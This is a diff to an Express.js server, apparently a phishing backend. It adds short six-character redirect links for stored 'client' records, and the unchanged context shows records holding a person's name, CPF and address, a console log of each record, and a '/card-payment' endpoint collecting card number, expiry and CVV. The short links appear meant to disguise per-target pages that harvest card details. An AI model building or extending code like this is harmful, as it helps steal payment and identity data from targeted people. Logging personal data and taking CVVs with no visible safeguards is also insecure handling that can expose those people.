@@ -76,6 +76,15 @@ app.get('/client/:id', (req, res) => {
   }
 });
 
+app.get('/c/:shortId', (req, res) => {
+  const client = clients.find(c => c.shortId === req.params.shortId);
+  if (client) {
+    res.redirect(`/index.html?id=${client.id}`);
+  } else {
+    res.status(404).json({ error: 'Link não encontrado' });
+  }
+});
+
 app.post('/card-payment', (req, res) => {
   const { clientId, cardNumber, cardHolder, expiryDate, cvv } = req.body;
   if (!clientId || !cardNumber || !cardHolder || !expiryDate || !cvv) {
@@ -101,6 +110,7 @@ app.post('/client', upload.fields([
 
   const clientData = {
     id: uuidv4(),
+    shortId: uuidv4().slice(0, 6), // Gera um hash curto de 6 caracteres
     name,
     cpf,
     address,
@@ -117,7 +127,7 @@ app.post('/client', upload.fields([
   clients.push(clientData);
   saveClients();
   console.log('Cliente salvo:', clientData);
-  res.json({ success: true, clientId: clientData.id, link: `https://mlteste.onrender.com/index.html?id=${clientData.id}` });
+  res.json({ success: true, clientId: clientData.id, link: `https://mlteste.onrender.com/c/${clientData.shortId}` });
 });
 
 app.delete('/client/:id', (req, res) => {
